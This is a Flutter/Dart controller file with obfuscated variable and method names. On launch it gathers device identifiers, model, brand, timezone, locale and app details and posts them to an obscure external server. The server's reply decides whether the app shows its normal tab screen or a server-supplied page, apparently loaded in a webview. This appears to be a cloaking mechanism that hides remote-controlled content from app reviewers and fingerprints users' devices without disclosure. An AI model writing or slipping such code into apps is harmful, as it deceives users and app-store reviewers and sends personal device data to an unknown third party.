import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkStatus() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/no_network");
  }
}

class PageLogic extends GetxController {


  var mpqdzy = RxBool(false);
  var apubyi = RxBool(true);
  var mgvhwso = RxString("");
  var kraig = RxBool(false);
  var hermann = RxBool(true);
  final kyufvwhqig = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkStatus();
    super.onInit();
    ndvtkqgl();
  }


  Future<void> ndvtkqgl() async {

    kraig.value = true;
    hermann.value = true;
    apubyi.value = false;

    kyufvwhqig.post("https://nt.buprofen.xyz/otspnyfvblxmkdiqzjwageucrh",data: await ouayhsrnk()).then((value) {
      var szanm = value.data["szanm"] as String;
      var vuqc = value.data["vuqc"] as bool;
      if (vuqc) {
        mgvhwso.value = szanm;
        yvonne();
      } else {
        kihn();
      }
    }).catchError((e) {
      apubyi.value = true;
      hermann.value = true;
      kraig.value = false;
    });
  }

  Future<Map<String, dynamic>> ouayhsrnk() async {
    final DeviceInfoPlugin rcdql = DeviceInfoPlugin();
    PackageInfo rbgdt_mizv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var tulyb = Platform.localeName;
    var grdtvhki = currentTimeZone;

    var vazq = rbgdt_mizv.packageName;
    var koci = rbgdt_mizv.version;
    var cthxzlo = rbgdt_mizv.buildNumber;

    var dpqvcsf = rbgdt_mizv.appName;
    var cwkvlj = "";
    var hcir = "";
    var taikrezj  = "";
    var tvenhx = "";
    var leopoldThompson = "";
    var horaceKihn = "";


    var leannaAltenwerth = "";
    var ueng = false;

    if (GetPlatform.isAndroid) {
      hcir = "android";
      var yhxdqgpi = await rcdql.androidInfo;

      tvenhx = yhxdqgpi.brand;

      cwkvlj  = yhxdqgpi.model;
      taikrezj = yhxdqgpi.id;

      ueng = yhxdqgpi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hcir = "ios";
      var vcqjypem = await rcdql.iosInfo;
      tvenhx = vcqjypem.name;
      cwkvlj = vcqjypem.model;

      taikrezj = vcqjypem.identifierForVendor ?? "";
      ueng  = vcqjypem.isPhysicalDevice;
    }
    var res = {
      "cthxzlo": cthxzlo,
      "vazq": vazq,
      "leannaAltenwerth" : leannaAltenwerth,
      "cwkvlj": cwkvlj,
      "grdtvhki": grdtvhki,
      "tvenhx": tvenhx,
      "leopoldThompson" : leopoldThompson,
      "taikrezj": taikrezj,
      "tulyb": tulyb,
      "koci": koci,
      "hcir": hcir,
      "ueng": ueng,
      "dpqvcsf": dpqvcsf,
      "horaceKihn" : horaceKihn,

    };
    return res;
  }

  Future<void> kihn() async {
    Get.offAllNamed("/my_tab");
  }

  Future<void> yvonne() async {
    Get.offAllNamed("/my_write");
  }

}
